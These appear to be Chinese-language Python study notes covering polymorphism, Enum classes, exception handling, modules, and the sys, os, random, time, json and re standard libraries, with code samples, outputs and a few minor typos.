对于一个变量，我们只需要知道它是Animal类型，无需确切地知道它的子类型，就可以放心地调用run()方法，而具体调用的run()方法是作用在Animal、Dog、Cat还是Tortoise对象上，由运行时该对象的确切类型决定，这就是多态真正的威力：调用方只管调用，不管细节，而当我们新增一种Animal的子类时，只要确保run()方法编写正确，不用管原来的代码是如何调用的。这就是著名的“开闭”原则： 对扩展开放：允许新增Animal子类； 对修改封闭：不需要修改依赖Animal类型的run_twice()等函数。 检查类型 issubclass(cls, class_or_tuple)：检查cls是否为后一个类或元组包含的多个类中任意类的子类 isinstance(obj, class_or_tuple)：检查obj是否为后一个类或元组包含的多个类中任意类的对象 issubclass第一个参数是类名，isinstance第一个参数是变量 第二个参数皆可以使用元组 __bases__属性：使用该属性可以查看该类的所有直接父类 __subclasses__()方法：使用该方法可以查看该类的所有直接子类 枚举类实例有限且固定的类称为枚举类 枚举入门 直接使用Enum列出多个枚举值来创建枚举类 通过继承Enum基类来派生枚举类 http://c.biancheng.net/view/2305.html 一些具有特殊含义的类，其实例化对象的个数往往是固定的，比如用一个类表示月份，则该类的实例对象最多有 12 个；再比如用一个类表示季节，则该类的实例化对象最多有 4 个。 针对这种特殊的类，Python 3.4 中新增加了 Enum 枚举类。也就是说，对于这些实例化对象个数固定的类，可以用枚举类来定义。 例如，下面程序演示了如何定义一个枚举类： 123456from enum import Enumclass Color(Enum): # 为序列值指定value值 red = 1 green = 2 blue = 3 如果想将一个类定义为枚举类，只需要令其继承自 enum 模块中的 Enum 类即可。例如在上面程序中，Color 类继承自 Enum 类，则证明这是一个枚举类。 在 Color 枚举类中，red、green、blue 都是该类的成员（可以理解为是类变量）。注意，枚举类的每个成员都由 2 部分组成，分别为 name 和 value，其中 name 属性值为该枚举值的变量名（如 red），value 代表该枚举值的序号（序号通常从 1 开始）。 和普通类的用法不同，枚举类不能用来实例化对象，但这并不妨碍我们访问枚举类中的成员。访问枚举类成员的方式有多种，例如以 Color 枚举类为例，在其基础上添加如下代码： 12345678910#调用枚举成员的 3 种方式print(Color.red)print(Color['red'])print(Color(1))#调取枚举成员中的 value 和 nameprint(Color.red.value)print(Color.red.name)#遍历枚举类中所有成员的 2 种方式for color in Color: print(color) 程序输出结果为： Color.redColor.redColor.red1redColor.redColor.greenColor.blue 枚举类成员之间不能比较大小，但可以用 == 或者 is 进行比较是否相等，例如： 12print(Color.red == Color.green)print(Color.red.name is Color.green.name) 输出结果为： FlaseFlase 需要注意的是，枚举类中各个成员的值，不能在类的外部做任何修改，也就是说，下面语法的做法是错误的： 1Color.red = 4 除此之外，该枚举类还提供了一个 members 属性，该属性是一个包含枚举类中所有成员的字典，通过遍历该属性，也可以访问枚举类中的各个成员。例如： 12for name,member in Color.__members__.items(): print(name,&quot;-&gt;&quot;,member) 输出结果为： red -&gt; Color.redgreen -&gt; Color.greenblue -&gt; Color.blue 值得一提的是，Python 枚举类中各个成员必须保证 name 互不相同，但 value 可以相同，举个例子： 123456from enum import Enumclass Color(Enum): # 为序列值指定value值 red = 1 green = 1 blue = 3 print(Color['green']) 输出结果为： Color.red 可以看到，Color 枚举类中 red 和 green 具有相同的值（都是 1），Python 允许这种情况的发生，它会将 green 当做是 red 的别名，因此当访问 green 成员时，最终输出的是 red。 在实际编程过程中，如果想避免发生这种情况，可以借助 @unique 装饰器，这样当枚举类中出现相同值的成员时，程序会报 ValueError 错误。例如： 12345678910#引入 uniquefrom enum import Enum,unique#添加 unique 装饰器@uniqueclass Color(Enum): # 为序列值指定value值 red = 1 green = 1 blue = 3 print(Color['green']) 运行程序会报错： Traceback (most recent call last): File “D:\\python3.6\\demo.py”, line 3, in class Color(Enum): File “D:\\python3.6\\lib\\enum.py”, line 834, in unique (enumeration, alias_details))ValueError: duplicate values found in &lt;enum ‘Color’&gt;: green -&gt; red 除了通过继承 Enum 类的方法创建枚举类，还可以使用 Enum() 函数创建枚举类。例如： 12345678910111213from enum import Enum#创建一个枚举类Color = Enum(&quot;Color&quot;,('red','green','blue'))#调用枚举成员的 3 种方式print(Color.red)print(Color['red'])print(Color(1))#调取枚举成员中的 value 和 nameprint(Color.red.value)print(Color.red.name)#遍历枚举类中所有成员的 2 种方式for color in Color: print(color) Enum() 函数可接受 2 个参数，第一个用于指定枚举类的类名，第二个参数用于指定枚举类中的多个成员。 如上所示，仅通过一行代码，即创建了一个和前面的 Color 类相同的枚举类。运行程序，其输出结果为： Color.redColor.redColor.red1redColor.redColor.greenColor.blue 异常处理异常概述…… 异常处理机制使用try…except捕获异常…… 异常类的继承体系异常捕获时所有的父类异常的except块都应该排在子类异常的except后面 即：先处理小异常，再处理大异常 https://www.cnblogs.com/liujiacai/p/10280323.html 总结： BaseException 是所有异常类的基类，如果不清楚是那种异常，需要捕获所有异常，则直接使用 BaseException 捕获。其他所有异常仅仅是对基础异常的细化和分类 多异常捕获构建多个异常类的元组 访问异常信息 args：返回异常的错误编号和描述字符串 errno：返回异常的错误编号 strerror：返回异常的描述字符串 with_traceback()：处理异常的传播轨迹信息 12345678def foo(): try: file = open(&quot;a.txt&quot;); except Exception as e: print(e.args) print(e.errno) print(e.strerror)foo() else模块当try块没有出现异常时，程序会执行else块 如果希望某段代码的异常能被后面的except块捕获，将这段代码放在try块中。否则，放else中 使用finally回收资源有时，程序在try中打开了一些物理资源（例如数据库连接、网络连接、磁盘文件等） finally总会执行 try块必须，except和finally必须存在一个 除非try块、except块中调用了退出python解释器的方法，否则finally始终执行 只有当finally块执行完之后，系统才会再次跳回来执行try块、except块里的raise或return语句，如果finally块里也使用了raise或return，程序将不再执行try或except 异常处理嵌套…… 记录异常如果不捕获错误，自然可以让Python解释器来打印出错误堆栈，但程序也被结束了。既然我们能捕获错误，就可以把错误堆栈打印出来，然后分析错误原因，同时，让程序继续执行下去。 Python内置的logging模块可以非常容易地记录错误信息： 123456789101112131415161718# err_logging.pyimport loggingdef foo(s): return 10 / int(s)def bar(s): return foo(s) * 2def main(): try: bar('0') except Exception as e: logging.exception(e)main()print('END') 同样是出错，但程序打印完错误信息后会继续执行，并正常退出： 1234567891011$ python3 err_logging.pyERROR:root:division by zeroTraceback (most recent call last): File &quot;err_logging.py&quot;, line 13, in main bar('0') File &quot;err_logging.py&quot;, line 9, in bar return foo(s) * 2 File &quot;err_logging.py&quot;, line 6, in foo return 10 / int(s)ZeroDivisionError: division by zeroEND 通过配置，logging还可以把错误记录到日志文件里，方便事后排查。 使用raise引发异常引发异常…… 自定义异常类1class AuctionException(Exception):pass except和raise同时使用 应用后台需要通过日志来记录异常发生的详细情况 应用还需要根据异常向应用使用者传达某种提示 1234567891011121314151617181920212223242526class AuctionException(Exception): passclass AuctionTest: def __init__(self, init_price): self.init_price = init_price def bid(self, bid_price): d = 0.0 try: d = float(bid_price) except Exception as e: # 此处只是简单地打印异常信息 print(&quot;转换出异常：&quot;, e) # 再次引发自定义异常# raise AuctionException(&quot;竞拍价必须是数值，不能包含其他字符！&quot;) # ①# raise AuctionException(e) raise if self.init_price &gt; d: raise AuctionException(&quot;竞拍价比起拍价低，不允许竞拍！&quot;) initPrice = ddef main(): at = AuctionTest(20.4) try: at.bid(&quot;df&quot;) except AuctionException as ae: # 再次捕获到bid()方法中的异常，并对该异常进行处理 print('main函数捕捉的异常：', ae)main() python的异常传播轨迹python专门提供了traceback模块来处理异常传播轨迹 traceback.print_exc()：将异常传播轨迹信息输出到控制台或指定文件 format_exc()：将异常传播轨迹信息转换成字符串 模块和包模块化编程导入模块的语法…… 定义模块…… 为模块编写说明文档…… 为模块编写测试代码…… 加载模块 使用环境变量 将模块放在默认的模块加载路径下 使用环境变量…… 默认的模块加载路径…… 导入模块的本质输出语句会在import时自动执行 import导入的本质：将模块中的所有代码加载到内存并执行，然后将整个模块内容赋值给与模块同名的变量，该变量的类型是module，而在该模块定义的所有程序单元都相当于该module对象的成员 from import导入本质：模块中全部代码加载到内存并执行，然后只导入指定变量、函数等成员单元，不会将整个模块导入 模块的__all__变量在默认情况下from import*会导入该模块中所有不以下划线开头的程序单元 __all__变量，将变量的值设置成一个列表，只有该列表中的程序单元才会被暴露出来 如果希望使用__all__列表之外的程序单元 import pprint pprint.pprint from pprint import pprint pprint不在pprint模块的all列表中 使用包定义包文件夹中存在__init.py__文件 导入包内成员12from . import print_shapefrom .print_shape import * 查看模块内容模块包含什么 dir() __all__ 查看文档 help() help函数查看的就是__doc__属性值 __doc__ 查看模块的源文件路径__file__属性 1string.__file__ 常见模块syssys模块是与python解释器交互的⼀个接口 123&gt;&gt;&gt; [e for e in dir(sys) if not e.startswith('_')]['addaudithook', 'api_version', 'argv', 'audit', 'base_exec_prefix', 'base_prefix', 'breakpointhook', 'builtin_module_names', 'byteorder', 'call_tracing', 'callstats', 'copyright', 'displayhook', 'dllhandle', 'dont_write_bytecode', 'exc_info', 'excepthook', 'exec_prefix', 'executable', 'exit', 'flags', 'float_info', 'float_repr_style', 'get_asyncgen_hooks', 'get_coroutine_origin_tracking_depth', 'getallocatedblocks', 'getcheckinterval', 'getdefaultencoding', 'getfilesystemencodeerrors', 'getfilesystemencoding', 'getprofile', 'getrecursionlimit', 'getrefcount', 'getsizeof', 'getswitchinterval', 'gettrace', 'getwindowsversion', 'hash_info', 'hexversion', 'implementation', 'int_info', 'intern', 'is_finalizing', 'last_traceback', 'last_type', 'last_value', 'maxsize', 'maxunicode', 'meta_path', 'modules', 'path', 'path_hooks', 'path_importer_cache', 'platform', 'prefix', 'pycache_prefix', 'set_asyncgen_hooks', 'set_coroutine_origin_tracking_depth', 'setcheckinterval', 'setprofile', 'setrecursionlimit', 'setswitchinterval', 'settrace', 'stderr', 'stdin', 'stdout', 'thread_info', 'unraisablehook', 'version', 'version_info', 'warnoptions', 'winver'] sys.argv：获取运行python程序的命令行参数 sys.argv[0]指该python程序 sys.argv[1]代表为python程序提供的第一个参数 sys.byteorder：显示本地字节序的指示符，大端模式返回big，否则返回little sys.copyright：返回和python解释器有关的版权信息 sys.executable：返回python解释器在磁盘上的存储路径 sys.exit()：通过引发SystemExit异常来退出程序。将其放在try中不能阻止finally块的执行，正常退出时exit(0),错误退出sys.exit(1) os._exit(n)：可以放在try中，阻止finally块执行 sys.flags：该只读属性返回运行python命令时指定的旗标 sys.getfilesystemencoding()：返回在当前系统中保存文件所用的字符集 sys.getrefcount(object)：返回指定对象的引用次数。当object对象的引用次数为0时，系统会回收该对象 sys.getrecursionlimit()：返回python解释器当前支持的递归深度，可以通过setrecursionlimit()方法重新配置 sys.getswitchinterval()：返回在当前python解释器中线程切换的时间间隔，可以通过setswitchinterval()方法重新配置 sys.implementation：返回当前python解释器的实现 sys.maxsize：返回python整数支持的最大值 sys.modules：返回模块名和载入模块对应关系的字典 sys.path：该属性指定python查找模块的路径列表，可以通过修改动态增加 sys.append sys.platform：返回python解释器所在系统的标识符 sys.stdin：返回系统的标准输入流——一个类文件对象 sys.stdout：返回系统的标准输出流——一个类文件对象 sys.version：返回当前python解释器的版本信息 sys.winver：返回当前python解释器的主版本号 若某参数中有空格，应当用“ ”引出 os模块os模块是与操作系统交互的⼀个接⼝ 当前执行这个python⽂件的⼯作⽬录相关的⼯作路径 os.getcwd() 获取当前工作目录，即当前python脚本工作的目录路径 os.chdir(“dirname”) 改变当前脚本工作目录；相当于shell下cd os.curdir 返回当前目录: (‘.’) os.pardir 获取当前目录的父目录字符串名：(‘..’) 文件夹相关 os.makedirs(‘dirname1/dirname2’) 可生成多层递归目录 os.removedirs(‘dirname1’) 若目录为空，则删除，并递归到上一级目录，如若也为空，则删除，依此类推 os.mkdir(‘dirname’) 生成单级目录；相当于shell中mkdir dirname os.rmdir(‘dirname’) 删除单级空目录，若目录不为空则无法删除，报错；相当于shell中rmdir dirname os.listdir(‘dirname’) 列出指定目录下的所有文件和子目录，包括隐藏文件，并以列表方式打印 文件相关 os.remove() 删除一个文件 os.rename(“oldname”,”newname”) 重命名文件/目录 os.stat(‘path/filename’) 获取文件/目录信息 操作系统差异相关 os.sep 输出操作系统特定的路径分隔符，win下为”&quot;,Linux下为”/“ os.linesep 输出当前平台使用的行终止符，win下为”\\t\\n”,Linux下为”\\n” os.pathsep 输出用于分割文件路径的字符串 win下为;,Linux下为: os.name 输出字符串指示当前使用平台。win-&gt;’nt’; Linux-&gt;’posix’ 执行系统命令相关 os.system(“bash command”) 运行shell命令，直接显示 os.popen(“bash command“).read() 运行shell命令，获取执行结果 os.environ 获取系统环境变量 进程管理相关 os.abort() 生成一个SIGABRT信号给当前进程 os.excel(path, arg0, arg1…) 使用参数来执行path代表的执行文件 os.forkpty() fork一个子进程 os.kill(pid, sig) 将sig信号发送到pid对应的进程，用于结束该进程 os.killpg(pgid, sig) 将sig信号发送到pgid对应的进程组 os.popen(cmd, mode=’r’, buffering=-1) 用于向cmd命令打开读写管道 os.spawnl(mode, path, …) 用于在新进程中执行新程序 os.startfile(path[, operation]) 对指定文件使用该文件关联的工具执行operation对应的操作 os.system(command) 运行操作系统上的指令命令，且新程序所在进程会替代原有进程，包括os.excel path系列，和路径相关 os.path.abspath(path) 返回path规范化的绝对路径 os.path.split(path) 将path分割成目录和文件名二元组返回 os.path.dirname(path) 返回path的目录。其实就是os.path.split(path)的第一个元素 os.path.basename(path) 返回path最后的文件名。如何path以／或\\结尾，那么就会返回空值，即os.path.split(path)的第二个元素。 os.path.exists(path) 如果path存在，返回True；如果path不存在，返回False os.path.isabs(path) 如果path是绝对路径，返回True os.path.isfile(path) 如果path是一个存在的文件，返回True。否则返回False os.path.isdir(path) 如果path是一个存在的目录，则返回True。否则返回False os.path.join(path1[, path2[, …]]) 将多个路径组合后返回，第一个绝对路径之前的参数将被忽略 os.path.getatime(path) 返回path所指向的文件或者目录的最后访问时间 os.path.getmtime(path) 返回path所指向的文件或者目录的最后修改时间 os.path.getsize(path) 返回path的大小 os.fsencode(filename)：该函数对类路径(path-like)的文件名进行编码 os.fsdecode(filename)：该函数对类路径(path-like)的文件名进行解码 os.PathLike：这是一个类，代表一个类路径(path-like)对象 os.getenv(key, default=None)：获取指定环境变量的值 os.getlogin()：返回当前系统的登录用户名 os.getpid()：获取当前进程id os.getppid()：获取当前进程的父进程id os.putenv(key, value)：用于设置环境变量 os.cpu_count()：返回当前系统的CPU数量 os.urandom(size)：返回合适作为加密使用的、最多由N个字节组成的bytes对象 random12&gt;&gt;&gt; random.__all__['Random', 'seed', 'random', 'uniform', 'randint', 'choice', 'sample', 'randrange', 'shuffle', 'normalvariate', 'lognormvariate', 'expovariate', 'vonmisesvariate', 'gammavariate', 'triangular', 'gauss', 'betavariate', 'paretovariate', 'weibullvariate', 'getstate', 'setstate', 'getrandbits', 'choices', 'SystemRandom'] random.seed(a=None, version=2)：指定种子来初始化伪随机数生成器 random.randrange(start, stop[, step])：返回start到stop，步长为step的随机数，不生成区间对象，step&gt;stop则返回1，step=2为偶数，倍数 random.randint(a, b)：生成a&lt;=N&lt;=b的随机数，等同于random.randrange(a, b+1)的效果 random.choice(seq)：从seq中随机抽取一个元素，若seq为空，则引发IndexError异常 random.choices(seq, weights=None, *, cum_weights=None, k=1)：从seq序列中抽取k个元素，还可通过weights指定各元素的抽取权重 random.shuffle(x[, random])：对x序列重新随机排列 random.sample(population, k)：从population中随机抽取k个独立的元素 random.random()；生成一个从0.0(包含)到1.0(不包含)之间的伪随机浮点数 random.uniform(a, b)：生成a&lt;=N&lt;=b的随机数 random.expovariate(lambd)：生成呈指数分布的随机数 1random.choices(['python', 'swift', 'kotlin'], '5, 5, 1', k=6) time12&gt;&gt;&gt; [s for s in dir(time) if not s.startswith('_')]['altzone', 'asctime', 'ctime', 'daylight', 'get_clock_info', 'gmtime', 'localtime', 'mktime', 'monotonic', 'monotonic_ns', 'perf_counter', 'perf_counter_ns', 'process_time', 'process_time_ns', 'sleep', 'strftime', 'strptime', 'struct_time', 'thread_time', 'thread_time_ns', 'time', 'time_ns', 'timezone', 'tzname'] 结构化时间(struct_time) ：struct_time结构化时间共有9个元素:(年，月，日，时，分，秒，一年中第几周，一年中第几天等） 12&gt;&gt;&gt; dir(time.struct_time)['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'count', 'index', 'n_fields', 'n_sequence_fields', 'n_unnamed_fields', 'tm_gmtoff', 'tm_hour', 'tm_isdst', 'tm_mday', 'tm_min', 'tm_mon', 'tm_sec', 'tm_wday', 'tm_yday', 'tm_year', 'tm_zone'] 索引（Index） 属性（Attribute） 值（Values） 0 tm_year（年） 比如2011 1 tm_mon（月） 1月12日 2 tm_mday（日） 1月31日 3 tm_hour（时） 0 - 23 4 tm_min（分） 0 - 59 5 tm_sec（秒） 0 - 60 6 tm_wday（weekday） 0 - 6（0表示周一） 7 tm_yday（一年中的第几天） 1 - 366 8 tm_isdst（是否是夏令时） 默认为0 time.struct_time(tm_year=2018,…) time.struct_time(2018, 5, 2, 8, 0, 30, 3, 1, 0) 时间元组 time.asctime([t])：将时间元组或struct_time转换为时间字符串，默认为当前时间 time.ctime([secs])：将以秒数为代表的时间转换为时间字符串 time.gtime([secs])：将以秒数为代表的时间转换为struct_time对象 time.localtime([secs])：将以秒数为代表的时间转换为当前struct_time对象 time.mktime(t)：localtime的反转函数 time.perf_counter()：返回性能计数器的值，秒为单位 time.process_time()：返回当前进程使用CPU的时间 time.sleep(secs)：暂停secs秒 time.strftime(format[, t])：将时间元组或struct_time对象格式化为指定格式的字符串 time.strptime(format[, t])：将字符串格式的时间解析成struct_time对象 time.time()：返回1970,1,1,0至今秒数 time.timezone：返回地区时间的偏移，秒为单位 time.tzname：返回本地时区名字 格式模板 %y 两位数的年份表示（00-99） %Y 四位数的年份表示（000-9999） %m 月份（01-12） %d 月内中的一天（0-31） %H 24小时制小时数（0-23） %I 12小时制小时数（01-12） %M 分钟数（00=59） %S 秒（00-59） %a 本地简化星期名称 %A 本地完整星期名称 %b 本地简化的月份名称 %B 本地完整的月份名称 %c 本地相应的日期表示和时间表示 %j 年内的一天（001-366） %p 本地A.M.或P.M.的等价符 %U 一年中的星期数（00-53）星期天为星期的开始 %w 星期（0-6），星期天为星期的开始 %W 一年中的星期数（00-53）星期一为星期的开始 %x 本地相应的日期表示 %X 本地相应的时间表示 %Z 当前时区的名称 %% %号本身 时间戳是计算机能够识别的时间；时间字符串是人能够看懂的时间；元组则是用来操作时间的 几种格式之间的转换 12345678910111213141516171819import time# 格式化时间 ----&gt; 结构化时间ft = time.strftime('%Y/%m/%d %H:%M:%S') # '2021/08/05 23:45:15'st = time.strptime(ft,'%Y/%m/%d %H:%M:%S')print(st)# time.struct_time(tm_year=2021, tm_mon=8, tm_mday=5, tm_hour=23, tm_min=45, tm_sec=15, tm_wday=3, tm_yday=217, tm_isdst=-1)# 结构化时间 ---&gt; 时间戳t = time.mktime(st)print(t) # 1628178315.0# 时间戳 ----&gt; 结构化时间t = time.time()st = time.localtime(t)print(st)# 结构化时间 ---&gt; 格式化时间ft = time.strftime('%Y/%m/%d %H:%M:%S',st)print(ft) 123456789import time#结构化时间 --&gt; %a %b %d %H:%M:%S %Y串#time.asctime(结构化时间) 如果不传参数，直接返回当前时间的格式化串print(time.asctime(time.localtime(1550312090.4021888)))#时间戳 --&gt; %a %d %d %H:%M:%S %Y串#time.ctime(时间戳) 如果不传参数，直接返回当前时间的格式化串print(time.ctime(1550312090.4021888)) JSON支持JSON的基本知识JSON主要有两种数据结构： key-value对组成的数据结构，python中对应dict对象 有序集合，python中对应列表 使用JSON语法创建对象123456789101112object = { propertyName1 : propertyValue1, propertyName2 : { propertyName1 : propertyValue1, propertyName2 : propertyValue2, propertyName3 : propertyValue3, propertyName4 : propertyValue4 }, propertyName3 : info(), propertyName4 : propertyValue4} 使用JSON语法创建数组1var a = ['yeeku', 'nono']; python的JSON支持python对象到json字符串的转换规则： Python JSON dict object list, tuple array str, unicode string int, long, float number True true False false None null 1234json.dump(obj, fp, *, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, default=None, sort_keys=False, **kw)# 将obj对象转换成JSON字符串输出到fp流中，fp是一个支持write()方法的类对象文件json.dumps(obj, *, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, encoding=”utf-8”, default=None, sort_keys=False, **kw)# 将obj对象转换为JSON字符串，并返回该JSON字符串 json字符串到python对象的转换规则： JSON Python object dict array list string unicode number (int) int, long number (real) float true True false False null None 1234json.load()# 从fp流读取JSON字符串，将其恢复成JSON对象json.loads()# 将JSON字符串s恢复成JSON对象 正则表达式python的正则表达式12&gt;&gt;&gt; re.__all__['match', 'fullmatch', 'search', 'sub', 'subn', 'split', 'findall', 'finditer', 'compile', 'purge', 'template', 'escape', 'error', 'Pattern', 'Match', 'A', 'I', 'L', 'M', 'S', 'X', 'U', 'ASCII', 'IGNORECASE', 'LOCALE', 'MULTILINE', 'DOTALL', 'VERBOSE', 'UNICODE'] re.compile(pattern, flags=0)：该函数用于将正则表达式字符串编译成_sre.SRE_Pattern对象 re.match(pattern, string, flags=0)：尝试从字符串的开始位置来匹配正则表达式 re.search(pattern, string, flags=0)：扫描整个字符串，并返回字符串中第一处匹配pattern的匹配对象 re.findall(pattern, string, flags=0)：扫描整个字符串，并返回字符串中所有匹配pattern的子串组成的列表 re.finditer(pattern, string, flags=0)：扫描整个字符串，并返回字符串中所有匹配pattern的子串组成的迭代器 re.fullmatch(pattern, string, flags=0)：该函数要求整个字符串能匹配pattern re.sub(pattern, repl, string, count=0, flags=0)：用于将string中匹配pattern的替换成repl，count为最多替换多少次，0为全部 re.split(pattern, string, maxsplit=0, flags=0)：使用pattern对string进行分割，该函数返回分割得到的多个子串组成的列表 re.purge()：清楚正则表达式缓存 re.escape(pattern)：对模式中除ASCII字符、数值、下划线之外的字符进行转义,添加\\ 将正则表达式编译成一个pattern对象 1re.complie(&quot;正则表达式&quot;) pattern提供一系列的方法，来对文本进行匹配，一般返回一个match对象 通过使用match对象提供的方法来获取匹配结果 12345678910111213141516match.group() #获取该匹配对象中指定组所匹配的字符串match.__getitem__(g) # match.group(g)的简化写法 match[g]代替match.group(g)match.group(0)#获取匹配结果，结果同上match.groups() # 所匹配的字符串组成的元组match.groupdict() # 组成的字典match.span() #获取匹配范围，开始到结束match.start() #匹配开始位置match.end() #匹配结束位置# ?p&lt;名字&gt; 为正则表达式的组指定的名字match.pos：返回传给正则表达式的pos参数match.endpos：返回传给正则表达式的endpos参数match.lastindex：返回最后一个匹配的捕获组的整数索引match.lastgroup：返回最后一个匹配的捕获组的名字match.re：返回执行正则表达式匹配时所用的正则表达式match.string：返回执行正则表达式匹配时所用的字符串 正则表达式旗标 re.A：控制\\w \\W \\b \\B \\d \\D \\s \\S只匹配ASCII字符而不匹配所有的Unicode字符，可在正则表达式中使用?a行内旗标表示 re.DEBUG：显示编译正则表达式的Debug信息，无行内旗标 re.I或re.IGNORECASE：匹配时不区分大小写 ?i re.S：点(.)可以匹配包括换行符在内所有字符 re.X：允许分行书写正则表达式 创建正则表达式 元字符 匹配内容 \\w 匹配字母（包含中文）或数字或下划线 \\W 匹配非字母（包含中文）或数字或下划线 \\s 匹配任意的空白符 \\S 匹配任意非空白符 \\d 匹配数字 \\D 匹配非数字 \\A 从字符串开头匹配 \\z 匹配字符串的结束，如果是换行，只匹配到换行前的结果 \\n 匹配一个换行符 \\t 匹配一个制表符 ^ 匹配字符串的开始 $ 匹配字符串的结尾 . 匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。 […] 匹配字符组中的字符 [^…] 匹配除了字符组中的字符的所有字符 * 匹配0个或者多个左边的字符。 + 匹配一个或者多个左边的字符。 ？ 匹配0个或者1个左边的字符，非贪婪方式。 {n} 精准匹配n个前面的表达式。 {n,m} 匹配n到m次由前面的正则表达式定义的片段，贪婪方式 () 匹配括号内的表达式，也表示一个组 单字符匹配： 1234567891011121314151617181920import reprint(re.findall('\\w','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('\\W','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('\\s','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('\\S','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('\\d','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('\\D','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('\\A上大','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('^上大','上大人123asdfg%^&amp;*(_ \\t \\n)'))# print(re.findall('666\\z','上大人123asdfg%^&amp;*(_ \\t \\n)666'))print(re.findall('666\\Z','上大人123asdfg%^&amp;*(_ \\t \\n)666'))print(re.findall('666$','上大人123asdfg%^&amp;*(_ \\t \\n)666'))print(re.findall('\\n','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('\\t','上大人123asdfg%^&amp;*(_ \\t \\n)')) 1234567891011121314['上', '大', '人', '1', '2', '3', 'a', 's', 'd', 'f', 'g', '_']['%', '^', '&amp;', '*', '(', ' ', '\\t', ' ', '\\n', ')'][' ', '\\t', ' ', '\\n']['上', '大', '人', '1', '2', '3', 'a', 's', 'd', 'f', 'g', '%', '^', '&amp;', '*', '(', '_', ')']['1', '2', '3']['上', '大', '人', 'a', 's', 'd', 'f', 'g', '%', '^', '&amp;', '*', '(', '_', ' ', '\\t', ' ', '\\n', ')']['上大']['上大']['666']['666']['\\n']['\\t']Process finished with exit code 0 重复匹配： 12345678910111213141516171819202122232425262728293031323334353637383940import reprint(re.findall('a.b', 'ab aab a*b a2b a牛b a\\nb'))print(re.findall('a.b', 'ab aab a*b a2b a牛b a\\nb',re.DOTALL))print(re.findall('a?b', 'ab aab abb aaaab a牛b aba**b'))print(re.findall('a*b', 'ab aab aaab abbb'))print(re.findall('ab*', 'ab aab aaab abbbbb'))print(re.findall('a+b', 'ab aab aaab abbb'))print(re.findall('a{2,4}b', 'ab aab aaab aaaaabb'))print(re.findall('a.*b', 'ab aab a*()b'))print(re.findall('a.*?b', 'ab a1b a*()b, aaaaaab'))# .*? 此时的?不是对左边的字符进行0次或者1次的匹配,# 而只是针对.*这种贪婪匹配的模式进行一种限定:告知他要遵从非贪婪匹配 推荐使用!# []: 括号中可以放任意一个字符,一个中括号代表一个字符# - 在[]中表示范围,如果想要匹配上- 那么这个-符号不能放在中间.# ^ 在[]中表示取反的意思.print(re.findall('a.b', 'a1b a3b aeb a*b arb a_b'))print(re.findall('a[abc]b', 'aab abb acb adb afb a_b'))print(re.findall('a[0-9]b', 'a1b a3b aeb a*b arb a_b'))print(re.findall('a[a-z]b', 'a1b a3b aeb a*b arb a_b'))print(re.findall('a[a-zA-Z]b', 'aAb aWb aeb a*b arb a_b'))print(re.findall('a[0-9][0-9]b', 'a11b a12b a34b a*b arb a_b'))print(re.findall('a[*-+]b','a-b a*b a+b a/b a6b'))print(re.findall('a[-*+]b','a-b a*b a+b a/b a6b'))print(re.findall('a[^a-z]b', 'acb adb a3b a*b'))# 分组：() 制定一个规则,将满足规则的结果匹配出来print(re.findall('(.*?)_666', 'cs_666 zhao_888 叶良辰_666'))print(re.findall('href=&quot;(.*?)&quot;','&lt;a href=&quot;http://www.baidu.com&quot;&gt;点击&lt;/a&gt;'))print(re.findall('compan(y|ies)','Too many companies have gone bankrupt, and the next one is my company'))print(re.findall('compan(?:y|ies)','Too many companies have gone bankrupt, and the next one is my company'))# 分组() 中加入?: 表示将整体匹配出来而不只是()里面的内容 123456789101112131415161718192021222324['aab', 'a*b', 'a2b', 'a牛b']['aab', 'a*b', 'a2b', 'a牛b', 'a\\nb']['ab', 'ab', 'ab', 'b', 'ab', 'b', 'ab', 'b']['ab', 'aab', 'aaab', 'ab', 'b', 'b']['ab', 'a', 'ab', 'a', 'a', 'ab', 'abbbbb']['ab', 'aab', 'aaab', 'ab']['aab', 'aaab', 'aaaab']['ab aab a*()b']['ab', 'a1b', 'a*()b', 'aaaaaab']['a1b', 'a3b', 'aeb', 'a*b', 'arb', 'a_b']['aab', 'abb', 'acb']['a1b', 'a3b']['aeb', 'arb']['aAb', 'aWb', 'aeb', 'arb']['a11b', 'a12b', 'a34b']['a*b', 'a+b']['a-b', 'a*b', 'a+b']['a3b', 'a*b']['cs', ' zhao_888 叶良辰']['http://www.baidu.com']['ies', 'y']['companies', 'company']Process finished with exit code 0 常用方法举例： 1234567891011121314151617181920212223242526272829import re# findall 全部找到返回一个列表print(re.findall('a','aghjmnbghagjmnbafgv'))# search 只到找到第一个匹配然后返回一个包含匹配信息的对象,该对象可以通过调用group()方法得到匹配的字符串,如果字符串没有匹配，则返回Noneprint(re.search('sg|chensong', 'chensong sg sg demon xwz'))print(re.search('chensong', 'chensong sg sg barry xwzz').group())# match：None,同search,不过在字符串开始处进行匹配,完全可以用search+^代替matchprint(re.match('sg|chensong', 'chensong sg sg demon xwz'))print(re.match('chensong', 'chensong sg sg barry xwz').group())# split 分割 可按照任意分割符进行分割print(re.split('[:：,;；，]','1;3,c,a：3'))# sub 替换print(re.sub('帅哥','sg','陈松是一个帅哥'))# complie 根据包含的正则表达式的字符串创建模式对象。可以实现更有效率的匹配。obj = re.compile('\\d{2}')print(obj.search('abc123eeee').group())print(obj.findall('1231232aasd'))ret = re.finditer('\\d','asd123affess32432') # finditer返回一个存放匹配结果的迭代器print(ret)print(next(ret).group())print(next(ret).group())print([i.group() for i in ret]) findall：有多少找多少 search：只找一个 